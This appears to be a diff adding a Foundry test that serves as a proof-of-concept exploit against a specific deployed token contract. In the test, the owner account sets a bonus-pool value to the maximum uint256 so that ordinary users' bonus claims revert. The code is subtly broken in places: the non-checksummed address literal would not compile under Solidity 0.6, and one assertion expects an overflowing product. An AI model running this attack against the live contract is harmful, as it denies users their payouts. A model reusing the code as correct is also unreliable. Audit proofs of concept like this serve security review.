@@ -1,0 +1,78 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Test.sol";
+
+interface IMyCoinToken {
+    function owner() external view returns (address);
+    function balanceOf(address) external view returns (uint256);
+    function adminAddress(address) external view returns (bool);
+    function bounsTime() external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function getTime() external view returns (uint256);
+    function getDays() external view returns (string memory, string memory);
+    function getNowDate(uint256) external pure returns (string memory);
+    function dayPoolBounsPiece(string calldata) external view returns (uint256);
+    function sumBounsPiece(string calldata, uint256) external returns (bool);
+    function receiveBounsToken() external returns (uint256);
+    function setAdminAddress(address, bool) external returns (bool);
+    function webShowCanGetToken() external view returns (uint256, uint256, uint256, uint256);
+    function decimals() external pure returns (uint8);
+}
+
+contract ExploitTest is Test {
+    address constant TARGET = 0x7144e379c827fa71a7ecaa01d00607cbb7eb1b7a;
+    IMyCoinToken constant token = IMyCoinToken(TARGET);
+
+    address owner;
+    address user;
+    uint256 constant MIN_BOUNS_JOIN = 100000000000 * 1e9; // eachPiece
+
+    function setUp() public {
+        // Setup labels
+        owner = token.owner();
+        user = address(0x123456);
+        vm.label(owner, "Owner");
+        vm.label(user, "User");
+        vm.label(TARGET, "MyCoinToken");
+
+        // Warp to a time after bounsTime (1625068800 = 2021-07-01 00:00:00 UTC)
+        vm.warp(1625068800 + 3 days); // 2021-07-04
+
+        // Prepare: ensure contract has some token balance for dayPoolBouns calculations
+        vm.prank(owner);
+        token.transfer(TARGET, 1000 * 1e9); // admin transfer bypasses fees
+
+        // Fund user with enough tokens to claim bonus (>= 1e20)
+        vm.prank(owner);
+        token.transfer(user, MIN_BOUNS_JOIN); // admin transfer, no fees
+
+        // Ensure user is not admin
+        assertEq(token.adminAddress(user), false);
+
+        // Verify initial state
+        (string memory yesToday, ) = token.getDays();
+        assertEq(token.dayPoolBounsPiece(yesToday), 0, "Initial piece should be 0");
+    }
+
+    function testAbuseAuthorityBlocksBonuses() public {
+        // Get today's date strings
+        (string memory yesToday, ) = token.getDays();
+
+        // Owner calls sumBounsPiece with an extremely large value
+        vm.startPrank(owner);
+        uint256 huge = type(uint256).max;
+        token.sumBounsPiece(yesToday, huge);
+        vm.stopPrank();
+
+        // Verify that dayPoolBounsPiece[yesToday] is now huge
+        assertEq(token.dayPoolBounsPiece(yesToday), huge * 1e9, "Owner overwrote piece");
+
+        // Now user attempts to claim bonus – should revert due to underflow
+        vm.prank(user);
+        vm.expectRevert("SafeMath: subtraction overflow");
+        token.receiveBounsToken();
+    }
+}
+```
